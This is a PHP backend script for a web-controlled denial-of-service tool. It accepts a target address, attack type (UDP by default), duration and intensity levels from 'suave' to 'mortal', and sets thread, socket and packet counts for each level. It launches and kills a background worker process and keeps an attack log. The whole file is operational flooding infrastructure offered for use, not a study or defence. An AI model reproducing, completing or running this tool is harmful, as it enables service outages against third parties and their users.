<?php
header('Content-Type: application/json; charset=utf-8');
set_time_limit(0);

$action = $_POST['action'] ?? $_GET['action'] ?? '';

$dir = __DIR__ . '/runtime';
if (!is_dir($dir)) mkdir($dir, 0755, true);

$pidFile  = "$dir/attack.pid";
$logFile  = "$dir/attack.log";
$cfgFile  = "$dir/attack.cfg";

function json_out($data) {
    echo json_encode($data, JSON_UNESCAPED_UNICODE);
    exit;
}

if ($action === 'status') {
    $running = false;
    $pid = null;
    if (file_exists($pidFile)) {
        $pid = (int)file_get_contents($pidFile);
        if ($pid > 0 && function_exists('posix_kill') && @posix_kill($pid, 0)) {
            $running = true;
        } else {
            // fallback check
            $check = trim(shell_exec("ps -p $pid -o pid= 2>/dev/null"));
            if ($check) $running = true;
            else @unlink($pidFile);
        }
    }
    $log = file_exists($logFile) ? file_get_contents($logFile) : '';
    json_out(['running' => $running, 'pid' => $pid, 'log' => $log]);
}

if ($action === 'stop') {
    if (file_exists($pidFile)) {
        $pid = (int)file_get_contents($pidFile);
        if ($pid > 0) {
            if (function_exists('posix_kill')) @posix_kill($pid, 9);
            exec("kill -9 $pid 2>/dev/null");
            exec("pkill -9 -P $pid 2>/dev/null");
        }
        @unlink($pidFile);
    }
    $prev = file_exists($logFile) ? file_get_contents($logFile) : '';
    file_put_contents($logFile, $prev . "\n[!] ATAQUE DETENIDO MANUALMENTE\n");
    json_out(['ok' => true, 'msg' => 'stopped']);
}

if ($action === 'start') {
    if (file_exists($pidFile)) {
        $pid = (int)file_get_contents($pidFile);
        $alive = false;
        if ($pid > 0) {
            if (function_exists('posix_kill') && @posix_kill($pid, 0)) $alive = true;
            else {
                $check = trim(shell_exec("ps -p $pid -o pid= 2>/dev/null"));
                if ($check) $alive = true;
            }
        }
        if ($alive) json_out(['ok' => false, 'msg' => 'already running']);
    }

    $target    = trim($_POST['target'] ?? '');
    $type      = $_POST['type'] ?? 'udp';
    $intensity = $_POST['intensity'] ?? 'media';
    $duration  = max(1, (int)($_POST['duration'] ?? 30));
    $unit      = $_POST['unit'] ?? 's';

    if (!$target) json_out(['ok' => false, 'msg' => 'empty target']);

    $seconds = $duration;
    if ($unit === 'm') $seconds *= 60;
    if ($unit === 'h') $seconds *= 3600;

    $map = [
        'suave'    => [8, 40, 512],
        'baja'     => [25, 100, 1024],
        'media'    => [60, 200, 2048],
        'alta'     => [150, 400, 4096],
        'bastante' => [300, 700, 8192],
        'mortal'   => [600, 1200, 16384],
    ];
    [$threads, $sockets, $size] = $map[$intensity] ?? $map['media'];

    file_put_contents($logFile, '');
    file_put_contents($cfgFile, json_encode([
        'target' => $target, 'type' => $type, 'intensity' => $intensity,
        'seconds' => $seconds, 'threads' => $threads, 'sockets' => $sockets, 'size' => $size
    ]));

    $worker = __DIR__ . '/worker.php';
    $cmd = 'php ' . escapeshellarg($worker) . ' > /dev/null 2>&1 & echo $!';
    $pid = (int)trim(shell_exec($cmd));
    file_put_contents($pidFile, $pid);

    json_out(['ok' => true, 'pid' => $pid, 'msg' => 'started']);
}

json_out(['ok' => false, 'msg' => 'unknown action']);
